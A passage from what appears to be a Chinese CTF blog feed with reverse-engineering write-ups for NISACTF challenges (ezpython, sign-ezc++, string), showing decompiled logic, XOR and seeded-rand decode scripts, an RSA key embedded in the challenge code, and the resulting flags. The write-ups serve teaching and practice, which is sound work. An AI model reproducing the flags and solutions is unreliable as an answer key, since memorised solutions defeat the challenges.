b3cyVFJGLzk3b2NxMGNwY1orMUtsZTI1cEJ3bk9yRDJBCkVpMUVkMGVEV3dJR2gzaFhGRmlRSzhTOG5remZkNGFMa1ZxK1V3S0JpRXRMSllIamFZY0N2dTd5M0JpbG1ZK0gKbGZIYkZKTkowaXRhazRZZi9XZkdlOUd6R1h6bEhYblBoZ2JrZlZKeEVBU3ZCOE5NYjZ5WkM5THdHY09JZnpLRApiczJQMUhuT29rWnF0WFNxMCt1UnBJdEkxNFJFUzYySDJnZTNuN2dlMzJSS0VCYnVKb3g3YWhBL1k2d3ZscUhiCjFPTEUvNnJRWk0xRVF6RjRBMmpENmdlREJVbHhWTUVDZVFDQjcyUmRoYktNL3M0TSsvMmYyZXI4Y2hwT01SV1oKaU5Hb3l6cHRrby9sSnRuZ1RSTkpYSXdxYVNCMldCcXpndHNSdEhGZnpaNlNyWlJCdTd5Y0FmS3dwSCtUd2tsNQpoS2hoSWFTNG1vaHhwUVNkL21td1JzbTN2NUNDdXEvaFNtNmNXYTdFOVZxc25heGQzV21tQ2VqTnp0MUxQWUZNCkxZMENnWWdKUHhpVTVraGs5cHB6TVAwdWU0clA0Z2YvTENldEdmQjlXMkIyQU03eW9VM2VsMWlCSEJqOEZ3UFQKQUhKUWtCeTNYZEh3SUpGTUV1RUZSSFFzcUFkSTlYVDBzL2V0QTg1Y3grQjhjUmt3bnFHakFseW1PdmJNOVNrMgptMnRwRi8rYm56ZVhNdFA3c0ZoR3NHOXJ5SEZ6UFNLY3NDSDhXWWx0Y1pTSlNDZHRTK21qblAwelArSjMKLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0K'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>key2 <span class="token operator">=</span> rsa<span class="token punctuation">.</span>PublicKey<span class="token punctuation">.</span>load_pkcs1<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token string">'LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1JSUJDZ0tDQVFFQXFSVGdMUFNwbk9GQ0JybzR0dStRQVlxYU4yNlJONk82NW4wY1FERkcvb0NTSUlNNFNBeEUKVmsrYmR6UjdhbnFTbWdZeTBIUVhoQ2UzNlNlRmUxdHo5a3dLWi91M0VKb2M1QUs0dTV2eFFuUDlmNXE2YVFsbQpQL1YySU1weTRRUTZQY21FaDRLZDZvNWVkSVJQdkh3eldHVktPTkNwaS9LWkNPNldLVmJKV3Fod1hqREJsSDFNClVEc2dYMlVDOG9waHZ5OXVyMnpPZE5QaHBJSWR3SHNaOW9GWllrWjFMeUNJUUV0WUZpSmptRlMyRUNUVUNvcU8KWnJ0MWlOYzV1YWZxb2ZQeHh5T29sMGFVaFRoYmhxOHBKVy9xT0hXWHdMSW13bTZPemFxVXpLODRGMmN1YWRiRApOc3lTb2hJR2h2M3dJQVU4TUpRZzhLYXdWd2Rwc0VoZUl3SURBUUFCCi0tLS0tRU5EIFJTQSBQVUJMSUMgS0VZLS0tLS0K'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">encrypt1</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>    crypto_text <span class="token operator">=</span> rsa<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>message<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key2<span class="token punctuation">)</span>    <span class="token keyword">return</span> crypto_text<span class="token keyword">def</span> <span class="token function">decrypt1</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>    message_str <span class="token operator">=</span> rsa<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>message<span class="token punctuation">,</span> key1<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> message_str<span class="token keyword">def</span> <span class="token function">encrypt2</span><span class="token punctuation">(</span>tips<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>    ltips <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>tips<span class="token punctuation">)</span>    lkey <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>    secret <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    num <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> each <span class="token keyword">in</span> tips<span class="token punctuation">:</span>        <span class="token keyword">if</span> num <span class="token operator">>=</span> lkey<span class="token punctuation">:</span>            num <span class="token operator">=</span> num <span class="token operator">%</span> lkey        secret<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>each<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        num <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>secret<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">decrypt2</span><span class="token punctuation">(</span>secret<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>    tips <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>secret<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    ltips <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>tips<span class="token punctuation">)</span>    lkey <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>    secret <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    num <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> each <span class="token keyword">in</span> tips<span class="token punctuation">:</span>        <span class="token keyword">if</span> num <span class="token operator">>=</span> lkey<span class="token punctuation">:</span>            num <span class="token operator">=</span> num <span class="token operator">%</span> lkey        secret<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>each<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        num <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>secret<span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">'IAMrG1EOPkM5NRI1cChQDxEcGDZMURptPzgHJHUiN0ASDgUYUB4LGQMUGAtLCQcJJywcFmddNno/PBtQbiMWNxsGLiFuLwpiFlkyP084Ng0lKj8GUBMXcwEXPTJrRDMdNwMiHVkCBFklHgIAWQwgCz8YQhp6E1xUHgUELxMtSh0xXzxBEisbUyYGOx1DBBZWPg1CXFkvJEcxO0ADeBwzChIOQkdwXQRpQCJHCQsaFE4CIjMDcwswTBw4BS9mLVMLLDs8HVgeQkscGBEBFSpQFQQgPTVRAUpvHyAiV1oPE0kyADpDbF8AbyErBjNkPh9PHiY7O1ZaGBADMB0PEVwdCxI+MCcXARZiPhwfH1IfKitGOF42FV8FTxwqPzBPAVUUOAEKAHEEP2QZGjQVV1oIS0QBJgBDLx1jEAsWKGk5Nw03MVgmWSE4Qy5LEghoHDY+OQ9dXE44Th0='</span>key <span class="token operator">=</span> <span class="token string">'this is key'</span><span class="token keyword">try</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'please input key: '</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> result <span class="token operator">==</span> decrypt2<span class="token punctuation">(</span><span class="token string">'AAAAAAAAAAAfFwwRSAIWWQ=='</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>decrypt1<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>decrypt2<span class="token punctuation">(</span>flag<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> result <span class="token operator">==</span> key<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag&#123;0e26d898-b454-43de-9c87-eb3d122186bc&#125;'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'key is error.'</span><span class="token punctuation">)</span><span class="token keyword">except</span> Exception<span class="token punctuation">:</span>    e <span class="token operator">=</span> <span class="token boolean">None</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">finally</span><span class="token punctuation">:</span>        e <span class="token operator">=</span> <span class="token boolean">None</span>        <span class="token keyword">del</span> e<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在代码中插入：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span>decrypt2<span class="token punctuation">(</span><span class="token string">'AAAAAAAAAAAfFwwRSAIWWQ=='</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将 key 的输出置于 input 输入之前：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">flag <span class="token operator">=</span> <span class="token string">'IAMrG1EOPkM5NRI1cChQDxEcGDZMURptPzgHJHUiN0ASDgUYUB4LGQMUGAtLCQcJJywcFmddNno/PBtQbiMWNxsGLiFuLwpiFlkyP084Ng0lKj8GUBMXcwEXPTJrRDMdNwMiHVkCBFklHgIAWQwgCz8YQhp6E1xUHgUELxMtSh0xXzxBEisbUyYGOx1DBBZWPg1CXFkvJEcxO0ADeBwzChIOQkdwXQRpQCJHCQsaFE4CIjMDcwswTBw4BS9mLVMLLDs8HVgeQkscGBEBFSpQFQQgPTVRAUpvHyAiV1oPE0kyADpDbF8AbyErBjNkPh9PHiY7O1ZaGBADMB0PEVwdCxI+MCcXARZiPhwfH1IfKitGOF42FV8FTxwqPzBPAVUUOAEKAHEEP2QZGjQVV1oIS0QBJgBDLx1jEAsWKGk5Nw03MVgmWSE4Qy5LEghoHDY+OQ9dXE44Th0='</span>  key <span class="token operator">=</span> <span class="token string">'this is key'</span>  <span class="token comment"># ------------------------------------------------</span><span class="token keyword">print</span><span class="token punctuation">(</span>decrypt2<span class="token punctuation">(</span><span class="token string">'AAAAAAAAAAAfFwwRSAIWWQ=='</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># ------------------------------------------------</span><span class="token keyword">try</span><span class="token punctuation">:</span>      result <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'please input key: '</span><span class="token punctuation">)</span>      <span class="token keyword">if</span> result <span class="token operator">==</span> decrypt2<span class="token punctuation">(</span><span class="token string">'AAAAAAAAAAAfFwwRSAIWWQ=='</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>          <span class="token keyword">print</span><span class="token punctuation">(</span>decrypt1<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>decrypt2<span class="token punctuation">(</span>flag<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到 key 值：<code>this is true key</code><br>用得到的 key 值执行程序，即可获得 flag</p><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>flag{5236cb7d-f4a7-4080-9bde-8b9e061609ad}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NISACTF-ezpython7.png" alt="NISACTF-ezpython7.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【NISACTF】sign-ezc++</title>
      <link href="/posts/6644d4f6.html"/>
      <url>/posts/6644d4f6.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p><mark>在 C++ 中，注意命名空间，在命名空间中可能会藏有相关的函数</mark></p></li><li><p>在 IDA View-A 界面，注意汇编中数组的定义方法</p></li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NISACTF-sign-ezc%2B%2B0.png" alt="NISACTF-sign-ezc++0.png">  </p><p><mark>db 定义时，flag 的上下两行是连着的</mark>，<mark>2 dup(59h) 指连续 2个 59h，14h dup(0) 指连续 20个 0</mark>，完整的 flag :</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">flag db <span class="token number">44</span>h<span class="token punctuation">,</span> <span class="token number">2</span> <span class="token function">dup</span><span class="token punctuation">(</span><span class="token number">59</span>h<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">49</span>h<span class="token punctuation">,</span> <span class="token number">5</span>Eh<span class="token punctuation">,</span> <span class="token number">4</span>Ch<span class="token punctuation">,</span> <span class="token number">71</span>h<span class="token punctuation">,</span> <span class="token number">7</span>Eh<span class="token punctuation">,</span> <span class="token number">62</span>h<span class="token punctuation">,</span> <span class="token number">63</span>h<span class="token punctuation">,</span> <span class="token number">79</span>h<span class="token punctuation">,</span> <span class="token number">55</span>h<span class="token punctuation">,</span> <span class="token number">63</span>h<span class="token punctuation">,</span> <span class="token number">79</span>h<span class="token punctuation">,</span> <span class="token number">55</span>h<span class="token punctuation">,</span> <span class="token number">44</span>h<span class="token punctuation">,</span> <span class="token number">43</span>h<span class="token punctuation">,</span> <span class="token number">59</span>h<span class="token punctuation">,</span> <span class="token number">4</span>Bh<span class="token punctuation">,</span> <span class="token number">55</span>h<span class="token punctuation">,</span> <span class="token number">78</span>h<span class="token punctuation">,</span> <span class="token number">6F</span>h<span class="token punctuation">,</span> <span class="token number">55</span>h<span class="token punctuation">,</span> <span class="token number">79</span>h<span class="token punctuation">,</span> <span class="token number">63</span>h<span class="token punctuation">,</span> <span class="token number">6</span>Dh<span class="token punctuation">,</span> <span class="token number">64</span>h<span class="token punctuation">,</span> <span class="token number">77</span>h<span class="token punctuation">,</span> <span class="token number">14</span>h <span class="token function">dup</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><p><a href="https://www.ctfer.vip/problem/2041">【NISACTF】sign-ezc++</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>拖入 IDA 查找 main 函数</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NISACTF-sign-ezc%2B%2B1.png" alt="NISACTF-sign-ezc++1.png"></p><p>没有发现什么有用信息</p><p><code>shift + F12</code> 查看字符串：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NISACTF-sign-ezc%2B%2B2.png" alt="NISACTF-sign-ezc++2.png"></p><p>发现几个可能与 flag 有关的输出提示信息，查看这几个内容：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NISACTF-sign-ezc%2B%2B3.png" alt="NISACTF-sign-ezc++3.png"></p><p>这几句提示信息分别位于函数 <code>Human::introduce(void)</code> 和 <code>Man::introduce(void)</code> 内，且这两个函数仅仅是两句输出，没有其他功能</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NISACTF-sign-ezc%2B%2B4.png" alt="NISACTF-sign-ezc++4.png"></p><p>但是注意到 main 函数中并未调用这两个提示函数，<mark>不过可知存在两个命名空间，一个是 Human，一个是 Man</mark></p><p>搜索这两个命名空间中的函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NISACTF-sign-ezc%2B%2B5.png" alt="NISACTF-sign-ezc++5.png"></p><p>发现在 Human 的命名空间中有一个叫 <code>Human::give_flag(void)</code> 的函数</p><p>查看 <code>Human::give_flag(void)</code> 的内容：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NISACTF-sign-ezc%2B%2B6.png" alt="NISACTF-sign-ezc++6.png"></p><p>查看 flag 中的内容：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NISACTF-sign-ezc%2B%2B7.png" alt="NISACTF-sign-ezc++7.png"></p><p>将程序跑一遍应该就是 flag</p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span>  </span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">char</span> flag<span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x5E</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span>                      <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x4B</span><span class="token punctuation">,</span>                      <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span>                      <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>                      <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">48</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>          flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">0xAu</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      cout<span class="token operator">&lt;&lt;</span>flag<span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>NSSCTF{this_is_NISA_re_sign}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NISACTF-sign-ezc%2B%2B8.png" alt="NISACTF-sign-ezc++8.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【NISACTF】string</title>
      <link href="/posts/280c99a2.html"/>
      <url>/posts/280c99a2.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li>注意随机数产生函数 srand()，是由函数 rand 使用的随机数发生器</li></ul><p><mark>在给定随机数种子 seed 时， srand(seed) 是按照种子 seed 生成伪随机数，并非真的随机，其实每次运行结果都是一样的</mark></p><ul><li><mark>当执行产生随机数的代码时，尽量在 Linux 下执行代码，在 Windows 下产生的随机数可能会不一样</mark></li></ul><hr><p><a href="https://www.ctfer.vip/problem/2042">【NISACTF】string</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>拖入 IDA 查看 main 函数</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NISACTF-string1.png" alt="NISACTF-string1.png"></p><p>输入字符串 v4，然后调用 <code>flag()</code> 函数</p><p>查看 <code>flag()</code> 函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NISACTF-string2.png" alt="NISACTF-string2.png"></p><p>在下半部分发现一段直接输出 flag 的代码：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"The length of flag is 13"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">srand</span><span class="token punctuation">(</span>seed<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"NSSCTF&#123;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span> m <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> m <span class="token operator">&lt;</span> <span class="token number">13</span><span class="token punctuation">;</span> <span class="token operator">++</span>m <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  v4 <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>v4 <span class="token operator">%</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的 <code>putchar(125)</code> 就是输出 <code>&quot;&#125;&quot;</code> ，for 循环内的 <code>printf()</code> 输出就是输出的 flag</p><p>查看种子 seed 的初值： <code>seed = 0x2766</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NISACTF-string3.png" alt="NISACTF-string3.png"></p><p><mark>这里 seed &#x3D; 0x2766 定义了随机数种子， srand(seed) 是按照种子 seed 生成伪随机数，并非真的随机，其实每次运行结果都是一样的</mark></p><p>直接跑一遍代码：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span>  </span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">int</span> v4<span class="token punctuation">;</span>      <span class="token keyword">int</span> seed <span class="token operator">=</span> <span class="token number">0x2766</span><span class="token punctuation">;</span>      <span class="token function">srand</span><span class="token punctuation">(</span>seed<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"NSSCTF&#123;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> m <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> m <span class="token operator">&lt;</span> <span class="token number">13</span><span class="token punctuation">;</span> <span class="token operator">++</span>m<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          v4 <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>v4 <span class="token operator">%</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 Windows 上的运行结果：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NISACTF-string4.png" alt="NISACTF-string4.png"></p><p>但是这个答案是错误的</p><p><mark>这是一个坑点，不能使用 Windows 运行这段代码，因为生产出的随机数不一样</mark></p><p>在 Kali Linux 上执行该代码：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NISACTF-string5.png" alt="NISACTF-string5.png"></p><p>编译并执行：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/NISACTF-string6.png" alt="NISACTF-string6.png"></p><p>这个结果是正确的</p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> seed <span class="token operator">=</span> <span class="token number">0x2766</span><span class="token punctuation">;</span><span class="token function">srand</span><span class="token punctuation">(</span>seed<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"NSSCTF&#123;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token keyword">int</span> l <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> l <span class="token operator">&lt;</span> <span class="token number">13</span><span class="token punctuation">;</span> <span class="token operator">++</span>l <span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> v4 <span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span 